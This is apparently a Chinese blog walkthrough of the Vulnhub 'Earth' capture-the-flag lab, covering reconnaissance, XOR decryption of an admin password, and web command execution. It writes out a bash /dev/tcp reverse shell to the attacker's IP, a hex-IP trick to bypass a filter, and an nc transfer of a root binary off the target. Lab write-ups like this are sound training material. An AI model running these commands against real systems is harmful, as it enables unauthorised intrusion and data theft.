@@ -1,0 +1,319 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Vulnhub-THE PLANETS EARTH | Putdownd’s Blog</title><meta name="keywords" content="Vulnhub"><meta name="author" content="putdown"><meta name="copyright" content="putdown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="描述 Name: The Planets: Earth Date release: 2 Nov 2021 Author: SirFlash Series: The Planets  Difficulty: Easy Earth is an easy box though you will likely find it more challenging than “Mercury” in this">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub-THE PLANETS EARTH">
+<meta property="og:url" content="https://blog.putdown.top/archives/d23a16db.html">
+<meta property="og:site_name" content="Putdownd’s Blog">
+<meta property="og:description" content="描述 Name: The Planets: Earth Date release: 2 Nov 2021 Author: SirFlash Series: The Planets  Difficulty: Easy Earth is an easy box though you will likely find it more challenging than “Mercury” in this">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.putdown.top/img/e5925563a436d850cfc6184421b9ec77.jpeg">
+<meta property="article:published_time" content="2022-10-07T09:07:46.000Z">
+<meta property="article:modified_time" content="2023-11-17T07:58:13.000Z">
+<meta property="article:author" content="putdown">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.putdown.top/img/e5925563a436d850cfc6184421b9ec77.jpeg"><link rel="shortcut icon" href="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png"><link rel="canonical" href="https://blog.putdown.top/archives/d23a16db"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="code-t8FWZKLQce"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?f755324450eb55ec18bb83a2d2f2334e";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Vulnhub-THE PLANETS EARTH',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-17 07:58:13'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Putdownd’s Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">115</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/e5925563a436d850cfc6184421b9ec77.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Putdownd’s Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhub-THE PLANETS EARTH</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-07T09:07:46.000Z" title="发表于 2022-10-07 09:07:46">2022-10-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-17T07:58:13.000Z" title="更新于 2023-11-17 07:58:13">2023-11-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vulnhub-THE PLANETS EARTH"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><ul>
+<li><strong>Name</strong>: The Planets: Earth</li>
+<li><strong>Date release</strong>: 2 Nov 2021</li>
+<li><strong>Author</strong>: <a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.vulnhub.com/author/sirflash,731/">SirFlash</a></li>
+<li><strong>Series</strong>: <a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.vulnhub.com/series/the-planets,362/">The Planets</a></li>
+</ul>
+<p>Difficulty: Easy</p>
+<p>Earth is an easy box though you will likely find it more challenging than “Mercury” in this series and on the harder side of easy, depending on your experience. There are two flags on the box: a user and root flag which include an md5 hash. This has been tested on VirtualBox so may not work correctly on VMware. Any questions&#x2F;issues or feedback please email me at: SirFlash at protonmail.com, though it may take a while for me to get back to you.</p>
+<hr>
+<h1 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007094315249.png" alt="image-20221007094315249"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali  192.168.169.220</span><br><span class="line">靶机   192.168.169.232</span><br></pre></td></tr></table></figure>
+
+<h2 id="ip扫描"><a href="#ip扫描" class="headerlink" title="ip扫描"></a>ip扫描</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007100239254.png" alt="image-20221007100239254"></p>
+<h2 id="修改hosts"><a href="#修改hosts" class="headerlink" title="修改hosts"></a>修改hosts</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007100325153.png" alt="image-20221007100325153"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows: C:\Windows\System32\dirvers\etc\hosts</span><br><span class="line"></span><br><span class="line">kali: /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.169.232 earth.local </span><br><span class="line">192.168.169.232 terratest.earth.local</span><br></pre></td></tr></table></figure>
+
+<p>然后在访问</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://earth.local/">https://earth.local</a></p>
+<p>和</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://terratest.earth.local/">https://terratest.earth.local</a></p>
+<h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://earth.local/">https://earth.local/</a></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007100358832.png" alt="image-20221007100358832"></p>
+<hr>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://terratest.earth.local/">https://terratest.earth.local/</a></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007100633984.png" alt="image-20221007100633984"></p>
+<h1 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h1><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007101629409.png" alt="image-20221007101629409"></p>
+<h2 id="访问-1"><a href="#访问-1" class="headerlink" title="访问"></a>访问</h2><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://earth.local/admin/login">https://earth.local/admin/login</a></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007101753307.png" alt="image-20221007101753307"></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://terratest.earth.local/robots.txt">https://terratest.earth.local/robots.txt</a></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007101815619.png" alt="image-20221007101815619"></p>
+<ul>
+<li>最后一个 <code>testingnotes.* </code>猜测后缀为 txt时有如下内容</li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://terratest.earth.local/testingnotes.txt">https://terratest.earth.local/testingnotes.txt</a></li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007101902789.png" alt="image-20221007101902789"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">测试安全消息传递系统注意事项：</span><br><span class="line"></span><br><span class="line">\*使用XOR加密作为算法，应该和RSA中使用的一样安全。</span><br><span class="line"></span><br><span class="line">\*地球已经确认他们收到了我们发送的信息。</span><br><span class="line"></span><br><span class="line">\*testdata.txt用于测试加密。</span><br><span class="line"></span><br><span class="line">**\*terra用作管理员门户的用户名。**</span><br><span class="line"></span><br><span class="line">**待办事项：**</span><br><span class="line"></span><br><span class="line">**\*我们如何安全地把每月的钥匙送到地球上？还是我们应该每周换钥匙？**</span><br><span class="line"></span><br><span class="line">**\*需要测试不同的密钥长度以防止暴力。钥匙应该放多长时间？**</span><br><span class="line"></span><br><span class="line">**\*需要改进消息传递界面和管理面板的界面，这是目前非常基本的。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://terratest.earth.local/testdata.txt">https://terratest.earth.local/testdata.txt</a></li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007101957114.png" alt="image-20221007101957114"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据辐射测年估计和其他证据，地球形成于45亿年前。在地球历史的最初10亿年里，生命出现在海洋中，并开始影响地球的大气层和表面，导致厌氧生物和后来的需氧生物的扩散。一些地质证据表明，生命可能早在41亿年前就出现了。</span><br></pre></td></tr></table></figure>
+
+<h1 id="分析-参考别人的"><a href="#分析-参考别人的" class="headerlink" title="分析(参考别人的)"></a>分析(参考别人的)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. terra 为管理员用户名</span><br><span class="line">2. 使用 XOR （异或）运算</span><br><span class="line">3. 需要将首页的   Previous Messages 与 testdata.txt 做 异或运算，进行解密。</span><br></pre></td></tr></table></figure>
+
+<p> Previous Messages:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Previous Messages:</span><br><span class="line">37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</span><br><span class="line"></span><br><span class="line">3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</span><br><span class="line"></span><br><span class="line">2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span><br></pre></td></tr></table></figure>
+
+<p> testdata.txt:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure>
+
+<p>别人的python代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import binascii str1 = &quot;这里附上三个加密字符串之一&quot;</span><br><span class="line"> </span><br><span class="line">testdata = &quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot;</span><br><span class="line"> </span><br><span class="line">//先将testdata文本编码，然后再将字符串转换成十六进制，为什么呢，因为XOR异或运算是十六进制运算符</span><br><span class="line"> </span><br><span class="line">testdata= binascii.b2a_hex(testdata.encode(&quot;utf-8&quot;))</span><br><span class="line"> </span><br><span class="line">//int（str1,16）指明str1是十六进制整数值，hex()将括号里的十进制数值转化为十六进制（XOR运算之后的数值是十进制·········）。</span><br><span class="line"> </span><br><span class="line">result = hex(int(str1 ,16) ^ int(testdata,16))</span><br><span class="line"> </span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+<p>带入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import binascii </span><br><span class="line">str1 = &quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;</span><br><span class="line">testdata = &quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot;</span><br><span class="line">testdata= binascii.b2a_hex(testdata.encode(&quot;utf-8&quot;))</span><br><span class="line">result = hex(int(str1 ,16) ^ int(testdata,16))</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
+<p>结果:</p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007104335490.png" alt="image-20221007104335490"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x6561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>16进制解密:<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.sojson.com/hexadecimal.html">https://www.sojson.com/hexadecimal.html</a></li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007104458068.png" alt="image-20221007104458068"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>发现全部是重复 : earthclimatechangebad4humans</p>
+<p>因此得到了账号密码:</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号:terra</span><br><span class="line">密码:earthclimatechangebad4humans</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007105031857.png" alt="image-20221007105031857"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007105053106.png" alt="image-20221007105053106"></p>
+<h1 id="来到一个命令执行的界面"><a href="#来到一个命令执行的界面" class="headerlink" title="来到一个命令执行的界面"></a>来到一个命令执行的界面</h1><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007105220171.png" alt="image-20221007105220171"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007105243617.png" alt="image-20221007105243617"></p>
+<h1 id="flag-1"><a href="#flag-1" class="headerlink" title="flag 1"></a>flag 1</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*flag*&quot; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007105410393.png" alt="image-20221007105410393"></p>
+<ul>
+<li>可知共有两个flag,分别是 user 下 和 root 下</li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007105727884.png" alt="image-20221007105727884"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/earth_web/user_flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007105556367.png" alt="image-20221007105556367"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Command output: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]</span><br></pre></td></tr></table></figure>
+
+<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.169.220/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007110103396.png" alt="image-20221007110103396"></p>
+<ul>
+<li><p>远程连接禁止。看别人说把ip转换16进制</p>
+</li>
+<li><p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.metools.info/other/ipconvert162.html">http://www.metools.info/other/ipconvert162.html</a></p>
+</li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007111022964.png" alt="image-20221007111022964"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C0A8A9DC</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xC0.0xA8.0xA9.0xDC</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/0xC0.0xA8.0xA9.0xDC/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007111004107.png" alt="image-20221007111004107"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行 find / -perm -u=s -type f 2&gt;/dev/null 查找一些高权限文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007111340322.png" alt="image-20221007111340322"></p>
+<ul>
+<li><p>有一个reset_root很可疑</p>
+</li>
+<li><p>这里使用nc命令, nc 可用于传输文件。</p>
+</li>
+</ul>
+<ol>
+<li>先在kali上输入nc -nlvp 7788 &gt;reset_root，开启监听</li>
+<li>在靶机shell上输入nc 192.168.169.220 7788 &lt; &#x2F;usr&#x2F;bin&#x2F;reset_root</li>
+<li>可以看到kali接收到数据并保存为reset_root.</li>
+</ol>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007111555681.png" alt="image-20221007111555681"></p>
+<ul>
+<li>使用strace工具检测reset_root文件的运行过程，如果没有可以下载安装下。</li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007112646828.png" alt="image-20221007112646828"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20221007112708393.png" alt="image-20221007112708393"></p>
